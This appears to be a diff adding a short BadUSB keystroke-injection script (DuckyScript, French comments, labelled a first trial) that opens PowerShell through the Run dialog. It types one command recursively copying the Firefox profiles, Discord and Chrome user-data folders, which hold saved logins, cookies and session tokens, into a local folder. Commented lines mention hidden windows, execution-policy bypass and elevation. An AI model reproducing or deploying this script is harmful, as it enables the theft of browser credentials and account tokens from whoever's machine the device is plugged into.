@@ -1,0 +1,19 @@
+REM essai numéro 1 
+
+		REM ouverture du powershell (-w h = abvec une fenêtre masquée)
+		REM -Ep Bypass : ExecutionPolicy Bypass, ignore la politique d'exécution de Powershell.
+DELAY 750
+GUI r
+DELAY 250
+STRING powershell
+ENTER
+		REM STRING powershell -Command "Start-Process powershell -verb RunAs"
+		REM ENTER
+		REM DELAY 1500
+		REM ALT o
+		REM DELAY 1000
+DELAY 1000
+STRING Copy-Item -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Destination "C:\Users\olivi\Bureau\Essai" -Recurse ; Copy-Item -Path "$env:APPDATA\discord" -Destination "C:\Users\olivi\Bureau\Essai" -Recurse ; Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome" -Destination "C:\Users\olivi\Bureau\Essai" -Recurse ; exit
+ENTER
+
+
